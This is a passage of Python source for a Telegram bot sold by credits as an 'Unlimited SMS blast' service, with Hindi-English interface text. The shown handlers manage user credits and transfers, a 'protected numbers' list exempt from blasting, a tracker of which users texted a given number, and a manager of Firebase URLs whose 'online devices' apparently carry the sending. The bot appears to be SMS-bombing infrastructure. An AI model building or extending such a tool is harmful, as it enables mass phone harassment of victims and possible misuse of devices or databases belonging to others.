@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await cq.answer("✅ No active sending!", show_alert=True)
            return
        session.cancelled = True
    await cq.answer("🛑 Stop signal bhej diya!", show_alert=True)


# ============================================================
# PROFILE / PREMIUM / SUPPORT / REFER CALLBACKS
# ============================================================

@R.callback_query(F.data == "user:profile")
async def user_profile(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    refer_code = udata.get("refer_code") or generate_user_refer_code(uid, d)
    save(d)
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '👤')} <b>ᴜsᴇʀ ᴘʀᴏғɪʟᴇ</b>\n\n"
        f"{em(EMOJI_GEAR, '🆔')} ɪᴅ     : <code>{uid}</code>\n"
        f"{em(EMOJI_STAR, '📛')} ɴᴀᴍᴇ   : <b>{cq.from_user.full_name}</b>\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs: <b>{udata.get('credits', 0)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} sᴍs    : <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_GIFT, '🎁')} ᴄᴏᴅᴇ   : <code>{refer_code}</code>\n"
        f"{em(EMOJI_CROWN, '👑')} ʀᴏʟᴇ   : {role_tag(uid, d)}",
        reply_markup=kb([("ʙᴀᴄᴋ", "user:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "user:premium")
async def user_premium(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '💎')} <b>ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴs</b>\n\n"
        f"{em(EMOJI_ROCKET, '🚀')} Unlimited SMS blast\n"
        f"{em(EMOJI_GEAR, '⚡')} Fast speed\n"
        f"{em(EMOJI_MONEY, '💰')} Bonus credits\n"
        f"{em(EMOJI_CHECK, '✅')} Priority support\n\n"
        f"{em(EMOJI_CROWN, '👑')} Contact: {OWNER_LINK}",
        reply_markup=kb([("ʙᴀᴄᴋ", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )


@R.callback_query(F.data == "user:support")
async def user_support(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '🆘')} <b>sᴜᴘᴘᴏʀᴛ</b>\n\n"
        f"{em(EMOJI_CROWN, '👑')} Owner: {OWNER_LINK}\n"
        f"{em(EMOJI_STAR, '👤')} {OWNER_NAME}\n\n"
        f"<i>Hum 24/7 available hain!</i>",
        reply_markup=kb([("ʙᴀᴄᴋ", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )


# ============================================================
# VIDEO MANAGER
# ============================================================

@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    videos = d.get("videos", [])
    images = d.get("images", [])
    await cq.message.edit_text(
        f"{DIVIDER}\n🖼 <b>ᴅᴀsʜʙᴏᴀʀᴅ ᴍᴇᴅɪᴀ</b>\n{DIVIDER}\n\n"
        f"📹 Videos: <b>{len(videos)}</b>\n🖼 Images: <b>{len(images)}</b>\n\n"
        f"<i>Ye media /start ke baad dashboard par random show hoga.</i>",
        reply_markup=videos_menu_kb(d),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.add_video)
    await cq.message.edit_text(
        f"{DIVIDER}\n🖼 <b>ᴀᴅᴅ ᴅᴀsʜʙᴏᴀʀᴅ ᴍᴇᴅɪᴀ</b>\n{DIVIDER}\n\n"
        f"Video ya image bhejein. URL/File ID bhi accept hai.",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:videos:menu")]),
        parse_mode="HTML"
    )


@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    if msg.photo:
        d.setdefault("images", []).append(msg.photo[-1].file_id)
        media_label = "Image"
    elif msg.video:
        d.setdefault("videos", []).append(msg.video.file_id)
        media_label = "Video"
    elif msg.document and msg.document.mime_type:
        if msg.document.mime_type.startswith("image"):
            d.setdefault("images", []).append(msg.document.file_id)
            media_label = "Image"
        elif msg.document.mime_type.startswith("video"):
            d.setdefault("videos", []).append(msg.document.file_id)
            media_label = "Video"
        else:
            media_label = None
    elif msg.text:
        d.setdefault("videos", []).append(msg.text.strip())
        media_label = "Media ID"
    else:
        media_label = None
    if not media_label:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid video ya image bhejein.", parse_mode="HTML")
        return
    save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>{media_label} Saved!</b>", reply_markup=videos_menu_kb(load()), parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    videos = d.get("videos", [])
    if 0 <= idx < len(videos):
        videos.pop(idx)
        d["videos"] = videos
        save(d)
        await cq.answer("🗑 Video Removed!")
    await owner_videos_menu(cq, state)


@R.callback_query(F.data.startswith("owner:images:del:"))
async def owner_images_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    idx = int(cq.data.split("owner:images:del:", 1)[1])
    images = d.get("images", [])
    if 0 <= idx < len(images):
        images.pop(idx)
        d["images"] = images
        save(d)
        await cq.answer("🗑 Image removed!")
    await owner_videos_menu(cq, state)


@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    d["videos"] = []
    d["images"] = []
    save(d)
    await cq.answer("🗑 All dashboard media deleted!", show_alert=True)
    await owner_videos_menu(cq, state)


# ============================================================
# PROTECT NUMBER
# ============================================================

@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(
        f"{em(EMOJI_LOCK, '🔒')} <b>ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ</b>\n\nJis number ko protect karna hai woh enter karo:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number!", parse_mode="HTML")
        return
    PROTECTED_NUMBERS[number] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_LOCK, '🔒')} <b>Number Protected!</b>\n\n<code>{number}</code>", reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.message.edit_text(
            f"{em(EMOJI_LOCK, '🔐')} <b>ᴘʀᴏᴛᴇᴄᴛᴇᴅ ɴᴜᴍʙᴇʀs</b>\n\n{em(EMOJI_CROSS, '❌')} <i>Koi number protected nahi hai.</i>",
            reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]),
            parse_mode="HTML"
        )
        return
    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>ᴘʀᴏᴛᴇᴄᴛᴇᴅ ɴᴜᴍʙᴇʀs</b>\n"]
    is_owner_user = True
    for number, protector_uid in protected.items():
        display_number = number
        protector_data = d.get("users", {}).get(str(protector_uid), {})
        protector_name = protector_data.get("name", "Unknown")
        lines.append(f"{em(EMOJI_PHONE, '📞')} <code>{display_number}</code> — {protector_name}")
    rows = []
    rows.append([btn("ʀᴇᴍᴏᴠᴇ", "owner:protected_remove", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.answer("❌ Koi protected number nahi!", show_alert=True)
        return
    rows = []
    for number in protected.keys():
        rows.append([btn(number, f"owner:protected_del:{number}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>ʀᴇᴍᴏᴠᴇ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )


@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    number = cq.data.split("owner:protected_del:", 1)[1]
    if number in d.get("protected_numbers", {}):
        del d["protected_numbers"][number]
        save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await cq.answer(f"✅ Protection removed!", show_alert=True)
    await owner_protected_list(cq, state)


# ============================================================
# TRACK NUMBER
# ============================================================

@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.track_number)
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>ɴᴜᴍʙᴇʀ ᴛʀᴀᴄᴋᴇʀ</b>\n\nJis number ki tracking karni hai woh enter karo:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number!", parse_mode="HTML")
        return
    await state.clear()
    all_history = d.get("sms_history", {})
    users_who_sent = []
    for uid_str, history_list in all_history.items():
        for entry in history_list:
            if entry.get("number") == number:
                user_data = d.get("users", {}).get(uid_str, {})
                users_who_sent.append({"uid": int(uid_str), "name": user_data.get("name", "Unknown"), "timestamp": entry.get("timestamp", 0)})
                break
    if not users_who_sent:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} <i>Is number pe kisi ne SMS nahi bheja.</i>", reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]), parse_mode="HTML")
        return
    lines = [f"{em(EMOJI_STAR, '📊')} <b>ᴛʀᴀᴄᴋᴇʀ</b>\n\n{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n"]
    for entry in users_who_sent:
        lines.append(f"• <code>{entry['uid']}</code> — {entry['name'][:20]} — {fmt_time(entry['timestamp'])}")
    await msg.answer("\n".join(lines), reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]), parse_mode="HTML")


# ============================================================
# ADD / DEDUCT ALL CREDITS
# ============================================================

@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴛᴏ ᴀʟʟ</b>\n\nKitne credits sabhi users ko dena hai?",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi user nahi!", reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]), parse_mode="HTML")
        return
    count = 0
    for uid_str in users:
        add_credits(int(uid_str), amount, d)
        count += 1
    save(d)
    notification = (
        f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎉')} Aapko <b>{amount}</b> credits mile hain!"
    )
    success = 0
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), notification, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.05)
        except: pass
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Done!</b>\n\n💰 {amount} credits each\n👥 {count} users\n📨 Notified: {success}",
        reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]),
        parse_mode="HTML"
    )
    log_activity(d, "add_credits_all", uid, f"Added {amount} to {count} users")


@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs ғʀᴏᴍ ᴀʟʟ</b>\n\nKitne credits sabhi users se katne hain?",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi user nahi!", reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]), parse_mode="HTML")
        return
    count = 0
    total_deducted = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])
    for uid_str, udata in users.items():
        user_id = int(uid_str)
        if user_id in owners or user_id in admins: continue
        current = udata.get("credits", 0)
        if current >= amount:
            udata["credits"] = current - amount
            count += 1
            total_deducted += amount
        elif current > 0:
            udata["credits"] = 0
            count += 1
            total_deducted += current
    save(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Deducted!</b>\n\n👥 Affected: {count}\n💰 Total: {total_deducted}",
        reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]),
        parse_mode="HTML"
    )
    log_activity(d, "deduct_credits_all", uid, f"Deducted {total_deducted}")


# ============================================================
# TRANSFER CREDITS
# ============================================================

@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        await cq.answer("🚫 Banned!", show_alert=True)
        return
    if not can_use(uid, d):
        await cq.answer("⛔ Access nahi!", show_alert=True)
        return
    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await cq.answer("❌ Min 2 credits chahiye!", show_alert=True)
        return
    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💸')} <b>ᴛʀᴀɴsғᴇʀ ᴄʀᴇᴅɪᴛs</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Your Credits: <b>{current_credits}</b>\n\n"
        f"{sc('step 1/2')}: Target User ID bhejo:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "user:home")]),
        parse_mode="HTML"
    )


@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        target_uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo!", parse_mode="HTML")
        return
    if target_uid == uid:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Apne aap ko nahi!", parse_mode="HTML")
        return
    if str(target_uid) not in d.get("users", {}):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} User not found!", parse_mode="HTML")
        return
    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Min 2 credits!", parse_mode="HTML")
        return
    await state.update_data(transfer_target=target_uid)
    await state.set_state(S.transfer_credits_amount)
    half = current_credits // 2
    await msg.answer(
        f"{em(EMOJI_MONEY, '💸')} <b>{sc('step 2/2')}</b>\n\n"
        f"Max Transfer (Half): <b>{half}</b>\n\n"
        f"Kitne credits transfer karne hain?",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "user:home")]),
        parse_mode="HTML"
    )


@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number!", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    target_uid = fsmd.get("transfer_target")
    current_credits = get_user_credits(uid, d)
    max_transfer = current_credits // 2
    if amount > max_transfer:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Max {max_transfer}!", parse_mode="HTML")
        return
    if not deduct_credits(uid, amount, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient!", parse_mode="HTML")
        return
    add_credits(target_uid, amount, d)
    save(d)
    await state.clear()
    try:
        await msg.bot.send_message(target_uid, f"{em(EMOJI_MONEY, '💸')} <b>+{amount} credits received!</b>", parse_mode="HTML")
    except: pass
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Transferred!</b>\n\nTo: <code>{target_uid}</code>\nAmount: {amount}\nYour Balance: {get_user_credits(uid, d)}",
        reply_markup=default_reply_keyboard(uid, d),
        parse_mode="HTML"
    )


# ============================================================
# OWNER HOME & FIREBASE
# ============================================================

@R.callback_query(F.data == "owner:analytics")
async def owner_analytics(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await cq.message.edit_text(
        analytics_dashboard_text(d),
        reply_markup=kb([("🔄 ʀᴇғʀᴇsʜ", "owner:analytics"), ("ʙᴀᴄᴋ", "owner:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass


@R.callback_query(F.data == "owner:fb:menu")
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.clear()
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>ғɪʀᴇʙᴀsᴇ ᴍᴀɴᴀɢᴇʀ</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b>",
        reply_markup=fb_menu_kb(d),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>ᴀᴅᴅ sɪɴɢʟᴇ ғɪʀᴇʙᴀsᴇ</b>\n\nFirebase URL bhejo:\n"
        f"<i>Format: Label | URL\nExample: MyApp | https://myapp.firebaseio.com</i>",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:fb:menu")]),
        parse_mode="HTML"
    )


@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1)
        label = parts[0].strip()
        url = parts[1].strip()
    else:
        url = text
        label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} URL must start with https://", parse_mode="HTML")
        return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already added!", reply_markup=fb_menu_kb(d), parse_mode="HTML")
        return
    fb_id = str(int(time.time()))
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Firebase Added!</b>\n\n{label}\n<code>{url}</code>", reply_markup=fb_menu_kb(load()), parse_mode="HTML")


@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>ʙᴜʟᴋ ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ ᴠɪᴀ ᴛxᴛ</b>\n\n"
        f"Ek `.txt` file upload karein jisme Firebase URLs hon.\n\n"
        f"<b>Formats:</b>\n"
        f"• <code>https://myapp.firebaseio.com</code>\n"
        f"• <code>Label | https://myapp.firebaseio.com</code>",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:fb:menu")]),
        parse_mode="HTML"
    )


@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    doc = msg.document
    if not doc.file_name.endswith('.txt'):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf `.txt` file bhejiyega!", parse_mode="HTML")
        return
    file_info = await msg.bot.get_file(doc.file_id)
    downloaded_file = await msg.bot.download_file(file_info.file_path)
    content = downloaded_file.read().decode('utf-8', errors='ignore')
    lines = content.splitlines()
    fbs = d.get("firebases", [])
    existing_urls = {fb["url"].rstrip("/") for fb in fbs}
    added_count = 0
    skipped_count = 0
    processed_in_file = set()
    for line in lines:
        line = line.strip()
        if not line: continue
        if "|" in line:
            parts = line.split("|", 1)
            label = parts[0].strip()
            url = parts[1].strip()
        else:
            url = line
            label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]
        if not (url.startswith("http://") or url.startswith("https://")):
            continue
        url = url.rstrip("/")
        if url in existing_urls or url in processed_in_file:
            skipped_count += 1
            continue
        processed_in_file.add(url)
        existing_urls.add(url)
        fb_id = str(int(time.time() * 1000) + random.randint(100, 999))
        fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
        added_count += 1
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>TXT Processed!</b>\n\n"
        f"🔥 Added: <b>{added_count}</b>\n"
        f"⚠️ Skipped: <b>{skipped_count}</b>\n"
        f"📊 Total: <b>{len(fbs)}</b>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )


@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid `.txt` file upload karein!", parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fb_id = cq.data.split("owner:fb:del:", 1)[1]
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    d = load()
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>ғɪʀᴇʙᴀsᴇ ᴍᴀɴᴀɢᴇʀ</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
        reply_markup=fb_menu_kb(d),
        parse_mode="HTML"
    )


# ============================================================
# STATS / OWNERS / ADMINS / BAN
# ============================================================

@R.callback_query(F.data.in_({"owner:stats", "admin:stats"}))
async def panel_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    is_owner_user = is_owner(uid, d)
    if not is_admin(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    await cq.answer("⏳ Fetching...")
    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale:
        FB_DEVICE_COUNTS.pop(k, None)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} None")
    for dv in devices:
        dev_lines.append(f"  {em(EMOJI_PHONE, '📱')} <b>{dv['dev_name'][:20]}</b> — {dv['fb_label'][:20]}")
    full = stats_text + "\n" + "\n".join(dev_lines)
    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"
    prefix = "owner" if is_owner_user else "admin"
    await cq.message.edit_text(
        full,
        reply_markup=kb([("ʀᴇғʀᴇsʜ", f"{prefix}:stats"), ("ʙᴀᴄᴋ", f"{prefix}:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>ᴏᴡɴᴇʀ</b>\n\nID: <code>{MAIN_OWNER}</code>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>ᴀᴅᴍɪɴs</b>\n\nNo admins configured.",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )


@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    d["free_mode"] = (cq.data == "owner:free:on")
    save(d)
    d = load()
    mode = "🟢 FREE MODE ON" if d["free_mode"] else "🔴 Approval Required"
    await cq.answer(f"Done! {mode}", show_alert=True)
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass


@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    prefix = "owner" if is_owner(uid, d) else "admin"
